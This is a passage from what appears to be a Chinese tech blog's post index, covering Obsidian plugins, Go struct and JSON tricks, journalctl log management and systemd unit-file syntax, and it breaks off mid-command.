`cmd+d`复制行\n+ Commander：调整命令显示位置【必备】\n+ Custom Attachment Location：自定义图片位置，类似Typora设置\n+ ~~Dataview：查询统计神器~~\n+ Easy Typing：输入增强，编辑格式化，括号自动匹配\n+ Editing Toolbar：Markdown 快捷工具栏\n+ Editor Syntax Highlight：代码高亮【必备】\n+ Excalidraw： 画图，很强悍好看。\n+ Find orphaned files and broken links：查找没有引用的文件和链接\n+ floating toc：浮动目录，比官方好用【必备】\n+ ~~Folder Note：为目录生成一个index文件，看下面所有的文件~~\n+ ~~Hover Editor：浮动弹窗文件编辑~~\n+ Icon Folder：设置文件夹Icon\n+ Linter：格式化markdown【必备】\n+ Minimal Theme Settings：Minimal主题配置\n+ Obsidian Git：Git同步【必备】\n+ Open In New Tab: 打开文件以新标签的形式\n+ QuickAdd：快速加入【必备】\n+ Remotely Save：第三方同步（dropbox）【必备】\n+ Style Settings：各种主题设置\n+ Table Generator：表格快速生成\n+ ~~Tag Wrangler：标签管理~~\n+ Tasks：TODO任务管理【必备】\n+ Text Generator：文本生成，chatgpt\n+ Weread Plugin：微信读书插件【必备】\n\n\n\n### 2.2 插件快捷键\n\n+ Tasks\n  + cmd + ,\n  + cmd + .\n+ QuickAdd\n  + cmd + m\n  \n\n\n\n### 2.3 手机上禁插件\n\n进入.obsidian文件夹，然后进入插件文件夹，你可以点击其中一个插件，访问**manifest.json**，这样也比较容易。\n\n当你点击该文件时，你会看到一个选项，上面写着 \"isDesktopOnly\": false。当你把它改为 \"true \"时，该插件将在移动端被禁用。\n\n\n\n# 3. 教程\n\n### 3.1 入门教程\n\n+ Obsidian论坛 https://forum-zh.obsidian.md/\n+ 社区插件：https://airtable.com/shrdmp10Lxmf5Wmgl/tblJqnWpcKURTjysX\n+ 操作入门：\n  + https://sspai.com/post/67476\n  + https://zhuanlan.zhihu.com/p/428519519\n  + https://catcoding.me/p/obsidian-for-programmer/\n  + https://publish.obsidian.md/chinesehelp/01+2021%E6%96%B0%E6%95%99%E7%A8%8B/2021%E5%B9%B4%E6%96%B0%E6%95%99%E7%A8%8B\n\n+ 插件折腾\n  + https://sspai.com/post/68394\n  + https://forum-zh.obsidian.md/t/topic/8728\n\n\n\n\n### 3.2 Kanban 使用\n\n\n\n### 3.3 QuickAdd + dataview\n\nhttps://forum-zh.obsidian.md/t/topic/200\n\n\n\n### 3.4 Dataview\n\nhttps://zhuanlan.zhihu.com/p/373623264\n\n```dataviewjs\nlet d = {}\nfunction process(k, v) {\n  Object.keys(v).forEach(function (x) {\n    x = dv.fileLink(x);\n    if (d[x]==undefined) { d[x] = []; }\n\td[x].push(dv.fileLink(k));\n  });\n}\nObject.entries(dv.app.metadataCache.unresolvedLinks)\n\t.filter(([k,v])=>Object.keys(v).length)\n\t.forEach(([k,v]) => process(k, v));\ndv.table([\"Non existing notes\", \"Linked from\"],\n         Object.entries(d).map(([k,v])=> [k, v.join(\" • \")]))\n```\n\n### 3.5 编辑\n\n+ [开启obsidian悬浮模式，极好的编辑体验 - 经验分享 - Obsidian 中文论坛](https://forum-zh.obsidian.md/t/topic/5676)\n\n\n\n### 3.6 格式化\n\n+ https://github.com/platers/obsidian-linter\n+ https://github.com/Yaozhuwa/easy-typing-obsidian\n","categories":["笔记"]},{"title":"golang的一些奇技淫巧","url":"%2Fp%2Fc79ad2a9.html","content":"\n好久没写golang相关的blog了, 记录一些常见的golang技巧。\n\n# 1. 不影响函数调用, 增加参数\n\n先看以下函数调用:\n\n```go\npackage main\n\nimport \"fmt\"\n\nfunc ExecUser(name string, age int) {\n\tfmt.Println(\"name:\", name, \"age:\", age)\n}\n\nfunc main() {\n\tExecUser(\"levonfly\", 9)\n}\n\n// name: levonfly age: 9\n```\n\n<!-- more -->\n\n这时候我想在原函数参数中传入我的邮箱等信息, 不仅需要修改函数定义, 还会影响以前的调用.\n\n在不影响以前函数调用的情况下, 支持动态传参.  并且在动态的基础上加上 key\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype ArgFunc func() (key string, value string)\n\nfunc BuildArgFunc(key string, value string) ArgFunc {\n\treturn func() (k string, v string) {\n\t\tk = key\n\t\tv = value\n\t\treturn\n\t}\n}\n\nfunc ExecUser(name string, age int, funcArgs ...ArgFunc) {\n\tfmt.Println(\"name:\", name, \"age:\", age)\n\tfor _, funcArg := range funcArgs {\n\t\tk, v := funcArg()\n\t\tfmt.Println(k, v)\n\t}\n}\n\nfunc main() {\n\tExecUser(\"levonfly\", 9)\n\tExecUser(\"levonfly\", 9, BuildArgFunc(\"email\", \"levonfly@gmail.com\"))\n\tExecUser(\"levonfly\", 9, BuildArgFunc(\"email\", \"levonfly@gmail.com\"), BuildArgFunc(\"sex\", \"man\"))\n}\n\n/*\nname: levonfly age: 9\n\nname: levonfly age: 9\nemail levonfly@gmail.com\n\nname: levonfly age: 9\nemail levonfly@gmail.com\nsex man\n*/\n```\n\n\n\n# 2. 临时增加struct字段\n\n```go\npackage main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n)\n\ntype Fixed struct {\n\tName string `json:\"name\"`\n\tAge  int    `json:\"age\"`\n}\n\nfunc main() {\n\toutputJson(Fixed{Name: \"levon\", Age: 9})\n}\n\nfunc outputJson(res interface{}) {\n\tdata, _ := json.Marshal(res)\n\tfmt.Println(string(data))\n}\n\n// {\"name\":\"levon\",\"age\":9}\n```\n\nFixed假设是别人定义的结构体, 不能修改, 但是我要想让结构体增加一下当前的时间\n\n\n\n### 2.1 临时struct增加字段\n\n```go\npackage main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"time\"\n)\n\ntype Fixed struct {\n\tName string `json:\"name\"`\n\tAge  int    `json:\"age\"`\n}\n\nfunc main() {\n\to := struct {\n\t\tFixed\n\t\tTime string `json:\"time\"`\n\t}{\n\t\tFixed: Fixed{Name: \"levon\", Age: 9},\n\t\tTime:  time.Now().Format(\"2006-01-02\"),\n\t}\n\toutputJson(o)\n}\n\n\nfunc outputJson(res interface{}) {\n\tdata, _ := json.Marshal(res)\n\tfmt.Println(string(data))\n}\n\n\n// {\"name\":\"levon\",\"age\":9,\"time\":\"2021-06-29\"}\n```\n\n\n\n### 2.2 临时struct重写json\n\n```go\npackage main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"time\"\n)\n\ntype Fixed struct {\n\tName string `json:\"name\"`\n\tAge  int    `json:\"age\"`\n}\n\ntype NewFixed struct {\n\tFixed\n}\n\nfunc (u *NewFixed) MarshalJSON() ([]byte, error) {\n\ttype Alias NewFixed\n\treturn json.Marshal(&struct {\n\t\t*Alias\n\t\tTime string `json:\"time\"`\n\t}{\n\t\tAlias: (*Alias)(u),\n\t\tTime:  time.Now().Format(\"2006-01-02\"),\n\t})\n}\n\nfunc main() {\n\toutputJson(&NewFixed{Fixed{Name: \"levonfly\", Age: 9}})\n}\n\nfunc outputJson(res interface{}) {\n\tdata, _ := json.Marshal(res)\n\tfmt.Println(string(data))\n}\n\n\n// {\"name\":\"levon\",\"age\":9,\"time\":\"2021-06-29\"}\n```\n\n\n\n# 3. 临时为struct增加一个动态结构体\n```go\npackage main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n)\n\ntype Info struct {\n\tA string `json:\"a\"`\n\tB int    `json:\"b\"`\n\tC string `json:\"c\"`\n}\n\nfunc main() {\n\tinfo := &Info{A: \"str1\", B: 100, C: \"str2\"}\n\toutputJson(info)\n}\n\nfunc outputJson(res interface{}) {\n\tdata, _ := json.Marshal(res)\n\tfmt.Println(string(data))\n}\n\n//{\"a\":\"str1\",\"b\":100,\"c\":\"str2\"}\n```\n\n这时候加入一个动态的结构体, 例如下面有可能是1个d的结构, 也有可能是 2个属性e,f 的结构,  并把他们组合\n\n```bash\n{\"d\":\"123\"}\n{\"e\":\"123\", \"f\":200}\n```\n\n\n\n解决思路就是倒入到一个 map[string]interface{} 里\n\n```go\npackage main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n)\n\ntype Info struct {\n\tA string `json:\"a\"`\n\tB int    `json:\"b\"`\n\tC string `json:\"c\"`\n}\n\nfunc main() {\n\tinfo := &Info{A: \"str1\", B: 100, C: \"str2\"}\n\n\t// 这里来了两个测试的动态结构\n\tvars1 := `{\"d\":\"123\"}`\n\tvars2 := `{\"e\":\"123\", \"f\":200}`\n\n\toutPuts := make(map[string]interface{})\n\trespByte, _ := json.Marshal(info)\n\t_ = json.Unmarshal(respByte, &outPuts)\n\t_ = json.Unmarshal([]byte(vars1), &outPuts)\n\t_ = json.Unmarshal([]byte(vars2), &outPuts)\n\n\toutputJson(outPuts)\n}\n\nfunc outputJson(res interface{}) {\n\tdata, _ := json.Marshal(res)\n\tfmt.Println(string(data))\n}\n\n//{\"a\":\"str1\",\"b\":100,\"c\":\"str2\",\"d\":\"123\",\"e\":\"123\",\"f\":200}\n```\n\n\n\n# 4. struct和interface\n\n### 4.1 限制一个struct实现interface\n\n如果`Engine` 没有实现`Engine`, 会报错.\n\n```go\nvar _ IRouter = &Engine{}\nvar _ IRouter = (*Engine)(nil)\n```\n\n\n\n# 5. 参考资料\n\n+ https://zhuanlan.zhihu.com/p/27472716\n+ http://choly.ca/post/go-json-marshalling/","tags":["golang"],"categories":["1_golang基础"]},{"title":"journal日志管理","url":"%2Fp%2F9a741526.html","content":"\nSystemd 统一管理所有 Unit 的启动日志。带来的好处就是，可以只用`journalctl`一个命令，查看所有日志（内核日志和应用日志）。日志的配置文件是`/etc/systemd/journald.conf`。\n\n<!-- more -->\n\nSystemd 的日志文件是二进制格式的，必须使用 Journald 提供的 journalctl 来查看，默认不带任何参数时会输出系统和所有后台进程的混合日志。\n\n默认日志最大限制为所在文件系统容量的 10%，可以修改 /etc/systemd/journald.conf 中的 SystemMaxUse 来指定该最大限制。\n\n# 1. 配置文件\n\n默认状态所有选项均为注释状态\n\n```bash\n[Journal]\nStorage=auto           #存储日志文件位置（\"volatile\" 表示仅保存在内存中，路径：/run/log/journal 、\"persistent\" 表示优先保存在磁盘上，路径：优先保存在 /var/log/journal、\"auto\"默认值、\"none\"不保存任何日志）\nCompress=yes            #压缩存储大于特定阈值的对象\nSeal=yes          #如果存在一个\"sealing key\"， 那么就为所有持久保存的日志文件启用 FSS验证\nSplitMode=uid   #是否按用户进行日志分割（分割策略：\"uid\" 表示每个用户都有专属日志文件系统用户仍写进系统日志，\"none\" 不进行日志分割，所有用户日志均写进系统日志\nSyncIntervalSec=5m    #向磁盘刷写日志时间间隔（error以上，不含error级别日志会立即刷写）\nRateLimitInterval=30s    \nRateLimitBurst=1000    #上下两个选项表示在30s内每个服务最多纪录1000条日志，多余日志丢弃\nSystemMaxUse=       #全部日志最大占用磁盘空间\nSystemKeepFree=     #除日志文件之外，至少保留多少空间给其他用途（磁盘）\nSystemMaxFileSize=     #单个日志文件最大占用磁盘空间\nRuntimeMaxUse=      #全部日志最大占用内存空间\nRuntimeKeepFree=    #除日志文件之外，至少保留多少空间给其他用途（内存）\nRuntimeMaxFileSize=     #单个日志文件最大占用内存大小\nMaxRetentionSec=      #日志文件最大保留期限（超过该时间自动删除）\nMaxFileSec=1month     #日志滚动时间间隔\nForwardToSyslog=yes   #表示是否将接收到的日志消息转发给传统的 syslog 守护进程\nForwardToKMsg=no        #表示是否将接收到的日志消息转发给内核日志缓冲区(kmsg)\nForwardToConsole=no    #表示是否将接收到的日志消息转发给系统控制台\nForwardToWall=yes      #表示是否将接收到的日志消息作为警告信息发送给所有已登录用户\nTTYPath=/dev/console     \nMaxLevelStore=debug      #表示记录到日志中的最高日志等级\nMaxLevelSyslog=debug     #转发给syslog进程的最高日志等级\nMaxLevelKMsg=notice     #转发给内核日志缓冲区(kmsg)的最高日志等级\nMaxLevelConsole=info     #转发给系统控制台的最高日志等级\nMaxLevelWall=emerg     #置作为警告信息发送给所有已登录用户的最高日志等级\nLineMax=48K     #每条日志记录最大的字节长度，超长部分自动打分割符进行分割\n```\n\n\n\n# 2. 命令\n\n### 2.1 查看日志\n\n```bash\n# 查看所有日志（默认情况下 ，只保存本次启动的日志）\n$ sudo journalctl\n\n# 显示尾部的最新10行日志\n$ sudo journalctl -n\n\n# 显示尾部指定行数的日志\n$ sudo journalctl -n 20\n\n# 实时滚动显示最新日志\n$ sudo journalctl -f\n\n# 查看指定时间的日志\n$ sudo journalctl --since=\"2012-10-30 18:17:16\"\n$ sudo journalctl --since \"20 min ago\"\n$ sudo journalctl --since yesterday\n$ sudo journalctl --since \"2015-01-10\" --until \"2015-01-11 03:00\"\n$ sudo journalctl --since 09:00 --until \"1 hour ago\"\n\n\n# 查看内核日志（不显示应用日志）\n$ sudo journalctl -k\n\n# 查看系统本次启动的日志\n$ sudo journalctl -b\n$ sudo journalctl -b -0\n\n# 查看上一次启动的日志（需更改设置）\n$ sudo journalctl -b -1\n\n\n# 查看指定优先级（及其以上级别）的日志，共有8级 0: emerg 1: alert 2: crit 3: err 4: warning 5: notice 6: info 7: debug\n$ sudo journalctl -p err -b\n```\n\n\n\n### 2.2 查看指定服务日志\n\n```bash\n# 查看指定服务的日志\n$ sudo journalctl /usr/lib/systemd/systemd\n\n# 查看指定进程的日志\n$ sudo journalctl _PID=1\n\n# 查看某个路径的脚本的日志\n$ sudo journalctl /usr/bin/bash\n\n# 查看指定用户的日志\n$ sudo journalctl _UID=33 --since today\n\n# 查看某个 Unit 的日志\n$ sudo journalctl -u nginx.service\n$ sudo journalctl -u nginx.service --since today\n\n# 实时滚动显示某个 Unit 的最新日志\n$ sudo journalctl -u nginx.service -f\n\n# 合并显示多个 Unit 的日志\n$ journalctl -u nginx.service -u php-fpm.service --since today\n```\n\n\n\n### 2.3 格式查看\n\n```bash\n# 日志默认分页输出，--no-pager 改为正常的标准输出\n$ sudo journalctl --no-pager\n\n# 以 JSON 格式（单行）输出\n$ sudo journalctl -b -u nginx.service -o json\n\n# 以 JSON 格式（多行）输出，可读性更好\n$ sudo journalctl -b -u nginx.serviceqq\n -o json-pretty\n```\n\n\n\n### 2.4 查看存储\n\n```bash\n# 显示日志占据的硬盘空间\n$ sudo journalctl --disk-usage\n\n# 仅保留500MB大小的日志文\n$ sudo journalctl --vacuum-size=500M\n\n# 指定日志文件保存多久\n$ sudo journalctl --vacuum-time=1years\n\n# 仅保留最近一个月的日志文件\n$ sudo journalctl --vacuum-time=1m\n\n# 仅保留最近2天的日志文件\n$ sudo journalctl --vacuum-time=2d\n```\n\n\n\n# 3. 参考资料\n\n+ http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html","tags":["journal"],"categories":["命令"]},{"title":"systemd和systemctl详解","url":"%2Fp%2Fc9c96ac3.html","content":"\n# 1. Systemd\n\n### 1.1 前言\n\n历史上，Linux 的启动一直采用init进程。 Systemd 设计目标是，为系统的启动和管理提供一套完整的解决方案。\n\nSystemd 是一系列工具的集合，其作用也远远不仅是启动操作系统，它还接管了后台服务、结束、状态查询，以及日志归档、设备管理、电源管理、定时任务等许多职责，并支持通过特定事件（如插入特定 USB 设备）和特定端口数据触发的 On-demand（按需）任务。\n\nSystemd 的后台服务还有一个特殊的身份——它是系统中 PID 值为 1 的进程。\n\n<!-- more -->\n\n### 1.2 特点\n\n+ 更少的进程\n\n  Systemd 提供了 服务按需启动 的能力，使得特定的服务只有在真定被请求时才启动。\n\n+ 允许更多的进程并行启动\n\n  在 SysV-init 时代，将每个服务项目编号依次执行启动脚本。Ubuntu 的 Upstart 解决了没有直接依赖的启动之间的并行启动。而 Systemd 通过 Socket 缓存、DBus 缓存和建立临时挂载点等方法进一步解决了启动进程之间的依赖，做到了所有系统服务并发启动。对于用户自定义的服务，Systemd 允许配置其启动依赖项目，从而确保服务按必要的顺序运行。\n\n+ 使用 CGroup 跟踪和管理进程的生命周期\n\n  在 Systemd 之间的主流应用管理服务都是使用 进程树 来跟踪应用的继承关系的，而进程的父子关系很容易通过 两次 fork 的方法脱离。\n\n  而 Systemd 则提供通过 CGroup 跟踪进程关系，引补了这个缺漏。通过 CGroup 不仅能够实现服务之间访问隔离，限制特定应用程序对系统资源的访问配额，还能更精确地管理服务的生命周期。\n\n+ 统一管理服务日志\n\n  Systemd 是一系列工具的集合， 包括了一个专用的系统日志管理服务：Journald。这个服务的设计初衷是克服现有 Syslog 服务的日志内容易伪造和日志格式不统一等缺点，Journald 用 二进制格式 保存所有的日志信息，因而日志内容很难被手工伪造。Journald 还提供了一个 journalctl 命令来查看日志信息，这样就使得不同服务输出的日志具有相同的排版格式， 便于数据的二次处理。\n\n### 1.3 Unit 和 Target\n\nUnit 是 Systemd 管理系统资源的基本单元，可以认为每个系统资源就是一个 Unit，并使用一个 Unit 文件定义。在 Unit 文件中需要包含相应服务的描述、属性以及需要运行的命令。\n\nTarget 是 Systemd 中用于指定系统资源启动组的方式，相当于 SysV-init 中的运行级别。\n\n简单说，Target 就是一个 Unit 组，包含许多相关的 Unit 。启动某个 Target 的时候，Systemd 就会启动里面所有的 Unit。从这个意义上说，Target 这个概念类似于”状态点”，启动某个 Target 就好比启动到某种状态。\n\n\n\n### 1.4 Systemd 目录\n\nUnit 文件按照 Systemd 约定，应该被放置指定的三个系统目录之一中。这三个目录是有优先级的，如下所示，越靠上的优先级越高。因此，在三个目录中有同名文件的时候，只有优先级最高的目录里的那个文件会被使用。\n\n- /etc/systemd/system：系统或用户自定义的配置文件\n- /run/systemd/system：软件运行时生成的配置文件\n- /usr/lib/systemd/system：系统或第三方软件安装时添加的配置文件。\n\nSystemd 默认从目录 /etc/systemd/system/ 读取配置文件。但是，里面存放的大部分文件都是符号链接，指向目录 /usr/lib/systemd/system/，真正的配置文件存放在那个目录。\n\n\n\n# 2. Unit\n\nSystemd 可以管理所有系统资源：将系统资源划分为12类。将每个系统资源称为一个 Unit。\n\nUnit 是 Systemd 管理系统资源的基本单位。使用一个 Unit File 作为 Unit 的单元文件，Systemd 通过单元文件控制 Unit 的启动。\n\n例如，MySQL服务被 Systemd 视为一个 Unit，使用一个 mysql.service 作为启动配置文件\n\n### 2.1 Unit File\n\nSystemd 将系统资源划分为12类，对应12种类型的单元文件\n\n| 系统资源类型 | 单元文件扩展名 | 单元文件描述                                                 | 备注                           |\n| ------------ | -------------- | ------------------------------------------------------------ | ------------------------------ |\n| Service      | .service       | 封装守护进程的启动、停止、重启和重载操作，是最常见的一种 Unit 文件 | 系统服务                       |\n| Target       | .target        | 定义 target 信息及依赖关系，一般仅包含 Unit 段               | 多个 Unit 构成的一个组         |\n| Device       | .device        | 对于 `/dev` 目录下的硬件设备，主要用于定义设备之间的依赖关系 | 硬件设备                       |\n| Mount        | .mount         | 定义文件系统的挂载点，可以替代过去的 `/etc/fstab` 配置文件   | 文件系统的挂载点               |\n| Automount    | .automount     | 用于控制自动挂载文件系统，相当于 SysV-init 的 autofs 服务    | 自动挂载点                     |\n| Path         | .path          | 用于监控指定目录或文件的变化，并触发其它 Unit 运行           | 文件或路径                     |\n| Scope        | .scope         | 这种 Unit 文件不是用户创建的，而是 Systemd 运行时产生的，描述一些系统服务的分组信息 | 不是由 Systemd 启动的外部进程  |\n| Slice        | .slice         | 用于表示一个 CGroup 的树                                     | 进程组                         |\n| Snapshot     | .snapshot      | 用于表示一个由 systemctl snapshot 命令创建的 Systemd Units 运行状态快照，可以切回某个快照 | Systemd 快照，可以切回某个快照 |\n| Socket       | .socket        | 监控来自于系统或网络的数据消息                               | 进程间通信的 socket            |\n| Swap         | .swap          | 定义一个用户做虚拟内存的交换分区                             | swap 文件                      |\n| Timer        | .timer         | 用于配置在特定时间触发的任务，替代了 Crontab 的功能          | 定时器                         |\n\n对于操作单元文件的命令，如果缺省扩展名，则默认`.service`扩展名\n\n### 2.2 语法\n\n先看一个示例\n\n```ini\n[Unit]\nDescription=Hello World\nAfter=docker.service\nRequires=docker.service\n[Service]\nTimeoutStartSec=0\nExecStartPre=-/usr/bin/docker kill busybox1\nExecStartPre=-/usr/bin/docker rm busybox1\nExecStartPre=/usr/bin/docker pull busybox\nExecStart=/usr/bin/docker run --name busybox1 busybox /bin/ sh -c \"while true; do echo Hello World; sleep 1; done\"\nExecStop=\"/usr/bin/docker stop busybox1\"\nExecStopPost=\"/usr/bin/docker rm busybox1\"\n[Install]\nWantedBy=multi-user.target\n```\n\nUnit 文件可以分为三个配置区段：\n\n+ Unit 段：所有 Unit 文件通用，用来定义 Unit 的元数据，以及配置与其他 Unit 的关系\n+ Service 段：服务（Service）类型的 Unit 文件（后缀为 .service）特有的，用于定义服务的具体管理和执行动作\n+ Install 段：所有 Unit 文件通用，用来定义如何启动，以及是否开机启动\n\n\n\nUnit 和 Install 段：所有 Unit 文件通用，用于配置服务（或其它系统资源）的描述、依赖和随系统启动的方式\n\nService 段：服务（Service）类型的 Unit 文件（后缀为 .service）特有的，用于定义服务的具体管理和操作方法\n\n单元文件中的区段名和字段名大小写敏感, 每个区段内都是一些等号连接的键值对（键值对的等号两侧不能有空格）\n\n\n\n### 2.3 Unit 段\n\nUnit 通常是配置文件的第一个区块，用来定义 Unit 的元数据，以及配置与其他 Unit 的关系。\n\n- `Description`：当前服务的简单描述\n- `Documentation`：文档地址，可以是一个或多个文档的 URL 路径\n- `Requires`：与其它 Unit 的强依赖关系，如果其中任意一个 Unit 启动失败或异常退出，当前 Unit 也会被退出\n- `Wants`：与其它 Unit 的弱依赖关系，如果其中任意一个 Unit 启动失败或异常退出，不影响当前 Unit 继续执行\n- `After`：该字段指定的 Unit 全部启动完成以后，才会启动当前 Unit\n- `Before`：该字段指定的 Unit 必须在当前 Unit 启动完成之后再启动\n- `Binds To`：与 Requires 相似，该字段指定的 Unit 如果退出，会导致当前 Unit 停止运行\n- `Part Of`：一个 Bind To 作用的子集，仅在列出的 Unit 失败或重启时，终止或重启当前 Unit，而不会随列出Unit 的启动而启动\n- `OnFailure`：当这个模板启动失败时，就会自动启动列出的每个模块\n- `Conflicts`：与这个模块有冲突的模块，如果列出的模块中有已经在运行的，这个服务就不能启动，反之亦然\n\n\n\n### 2.4 Install段\n\nInstall通常是配置文件的最后一个区块，用来定义如何启动，以及是否开机启动。\n\n- `WantedBy`：它的值是一个或多个 target，执行enable命令时，符号链接会放入`/etc/systemd/system`目录下以 target 名 + `.wants`后缀构成的子目录中\n\n- `RequiredBy`：它的值是一个或多个 target，执行enable命令时，符号链接会放入`/etc/systemd/system`目录下以 target 名 + `.required`后缀构成的子目录中\n\n- `Alias`：当前 Unit 可用于启动的别名\n\n- `Also`：当前 Unit 被 enable/disable 时，会被同时操作的其他 Unit\n\n  \n\n### 2.5 Service段\n\nService 用来 Service 的配置，只有 Service 类型的 Unit 才有这个区块。\n\n##### 2.5.1 启动类型\n\n+ Type：定义启动时的进程行为。它有以下几种值。\n\n  **Type=simple**：默认值，ExecStart字段启动的进程为主进程\n  服务进程不会 fork，如果该服务要启动其他服务，不要使用此类型启动，除非该服务是 socket 激活型\n\n  **Type=forking**：ExecStart字段将以fork()方式从父进程创建子进程启动，创建后父进程会立即退出，子进程成为主进程。\n  通常需要指定PIDFile字段，以便 Systemd 能够跟踪服务的主进程\n\n  对于常规的守护进程（daemon），除非你确定此启动方式无法满足需求，使用此类型启动即可\n\n  **Type=oneshot**：只执行一次，Systemd 会等当前服务退出，再继续往下执行, 适用于只执行一项任务、随后立即退出的服务\n  通常需要指定RemainAfterExit=yes字段，使得 Systemd 在服务进程退出之后仍然认为服务处于激活状态\n\n  **Type=dbus**：当前服务通过 D-Bus 信号启动。当指定的 BusName 出现在 DBus 系统总线上时，Systemd认为服务就绪\n\n  **Type=notify**：当前服务启动完毕会发出通知信号，通知 Systemd，然后 Systemd 再启动其他服务\n\n  **Type=idle**：Systemd 会等到其他任务都执行完，才会启动该服务。一种使用场合是：让该服务的输出，不与其他服务的输出相混合\n##### 2.5.2 启动行为\n\n+ `ExecStart`：启动当前服务的命令\n\n  ```bash\n  ExecStart=/bin/echo execstart1\n  ExecStart=\n  ExecStart=/bin/echo execstart2\n  ```\n\n  顺序执行设定的命令，把字段置空，表示清除之前的值\n\n- `ExecStartPre`：启动当前服务之前执行的命令\n- `ExecStartPost`：启动当前服务之后执行的命令\n- `ExecReload`：重启当前服务时执行的命令\n- `ExecStop`：停止当前服务时执行的命令\n- `ExecStopPost`：停止当前服务之后执行的命令\n- `RemainAfterExit`：当前服务的所有进程都退出的时候，Systemd 仍认为该服务是激活状态, 这个配置主要是提供给一些并非常驻内存，而是启动注册后立即退出，然后等待消息按需启动的特殊类型服务使用的\n\n+ `TimeoutSec`：定义 Systemd 停止当前服务之前等待的秒数\n\n##### 2.5.3 重启行为\n\n+ `RestartSec`：Systemd 重启当前服务间隔的秒数\n+ `KillMode`：定义 Systemd 如何停止服务，可能的值包括：\n  control-group（默认值）：当前控制组里面的所有子进程，都会被杀掉\n  process：只杀主进程（sshd 服务，推荐值）\n  mixed：主进程将收到 SIGTERM 信号，子进程收到 SIGKILL 信号\n  none：没有进程会被杀掉，只是执行服务的 stop 命令。\n+ `Restart`：定义何种情况 Systemd 会自动重启当前服务，可能的值包括：\n  no（默认值）：退出后不会重启\n  on-success：只有正常退出时（退出状态码为0），才会重启\n  on-failure：非正常退出时（退出状态码非0），包括被信号终止和超时，才会重启（守护进程，推荐值）\n  on-abnormal：只有被信号终止和超时，才会重启（对于允许发生错误退出的服务，推荐值）\n  on-abort：只有在收到没有捕捉到的信号终止时，才会重启\n  on-watchdog：超时退出，才会重启\n  always：不管是什么退出原因，总是重启\n\n##### 2.5.4 上下文\n\n- `PIDFile`：指向当前服务 PID file 的绝对路径。\n\n- `User`：指定运行服务的用户\n\n- `Group`：指定运行服务的用户组\n\n- `EnvironmentFile`：指定当前服务的环境参数文件。该文件内部的`key=value`键值对，可以用`$key`的形式，在当前配置文件中获取\n\n  启动`sshd`，执行的命令是`/usr/sbin/sshd -D $OPTIONS`，其中的变量`$OPTIONS`就来自`EnvironmentFile`字段指定的环境参数文件。\n  \n### 2.6 占位符\n\n在 Unit 文件中，有时会需要使用到一些与运行环境有关的信息，例如节点 ID、运行服务的用户等。这些信息可以使用占位符来表示，然后在实际运行中动态地替换为实际的值。\n\n- %n：完整的 Unit 文件名字，包括 .service 后缀名\n- %p：Unit 模板文件名中 @ 符号之前的部分，不包括 @ 符号\n- %i：Unit 模板文件名中 @ 符号之后的部分，不包括 @ 符号和 .service 后缀名\n- %t：存放系统运行文件的目录，通常是 “run”\n- %u：运行服务的用户，如果 Unit 文件中没有指定，则默认为 root\n- %U：运行服务的用户 ID\n- %h：运行服务的用户 Home 目录，即 %{HOME} 环境变量的值\n- %s：运行服务的用户默认 Shell 类型，即 %{SHELL} 环境变量的值\n- %m：实际运行节点的 Machine ID，对于运行位置每个的服务比较有用\n- %b：Boot ID，这是一个随机数，每个节点各不相同，并且每次节点重启时都会改变\n- %H：实际运行节点的主机名\n- %v：内核版本，即 “uname -r” 命令输出的内容\n- %%：在 Unit 模板文件中表示一个普通的百分号\n\n\n\n### 2.7 模板\n\n在现实中，往往有一些应用需要被复制多份运行，就会用到模板文件\n\n模板文件的写法与普通单元文件基本相同，只是模板文件名是以 @ 符号结尾。例如：apache@.service\n\n通过模板文件启动服务实例时，需要在其文件名的 @ 字符后面附加一个用于区分服务实例的参数字符串，通常这个参数是用于监控的端口号或控制台 TTY 编译号\n\n```bash\nsystemctl start apache@8080.service\n```\n\nSystemd 在运行服务时，首先寻找跟单元名完全匹配的单元文件，如果没有找到，才会尝试选择匹配模板\n\n例如上面的命令，System 首先会在约定的目录下寻找名为 apache@8080.service 的单元文件，如果没有找到，而文件名中包含 @ 字符，它就会尝试去掉后缀参数匹配模板文件。对于 apache@8080.service，Systemd 会找到 apache@.service 模板文件，并通过这个模板文件将服务实例化。\n\n\n\n# 3. Target\n\nTarget 就是一个 Unit 组，包含许多相关的 Unit 。启动某个 Target 的时候，Systemd 就会启动里面所有的 Unit。从这个意义上说，Target 这个概念类似于\"状态点\"，启动某个 Target 就好比启动到某种状态。\n\n在传统的 SysV-init 启动模式里面，有 RunLevel 的概念，跟 Target 的作用很类似。不同的是，RunLevel 是互斥的，不可能多个 RunLevel 同时启动，但是多个 Target 可以同时启动。\n\n### 3.1 target vs sysv-init\n\n- 默认的 RunLevel（在 /etc/inittab 文件设置）现在被默认的 Target 取代，位置是 /etc/systemd/system/default.target，通常符号链接到graphical.target（图形界面）或者multi-user.target（多用户命令行）。\n- 启动脚本的位置，以前是 /etc/init.d 目录，符号链接到不同的 RunLevel 目录 （比如 /etc/rc3.d、/etc/rc5.d 等），现在则存放在 /lib/systemd/system 和 /etc/systemd/system 目录。\n- 配置文件的位置，以前 init 进程的配置文件是 /etc/inittab，各种服务的配置文件存放在 /etc/sysconfig 目录。现在的配置文件主要存放在 /lib/systemd 目录，在 /etc/systemd 目录里面的修改可以覆盖原始设置。\n\nrunlevel是 SysV init 初始化系统中的概念，在Systemd初始化系统中使用的是 Target，他们之间的映射关系是\n\n| Runlevel | Target            | 说明                               |\n| -------- | ----------------- | ---------------------------------- |\n| 0        | poweroff.target   | 关闭系统                           |\n| 1        | rescue.target     | 维护模式                           |\n| 2,3,4    | multi-user.target | 多用户，无图形系统（命令行界面）   |\n| 5        | graphical.target  | 多用户，图形化系统（图形用户界面） |\n| 6        | reboot.target     | 重启系统                           |\n\n\n\n### 3.2  target vs unit\n\n如果一个target只包含一个Unit，那么该 target，没有对应的目录，指的就是这个 Unit, 例如 `hibernate.target`只包含 `systemd-hibernate.service`一个Unit.\n\n如果一个target包含多个Unit，那么该target，有对应的 xxx.target.wants 目录，指的是目录里面所有的Unit, 例如`multi-user.target` 包含位于`/etc/systemd/system/multi-user.target.wants`目录下的多个 Unit.\n\n\n\n### 3.3 target 命令\n\n```bash\n# 查看当前系统的所有 Target\n$ systemctl list-unit-files 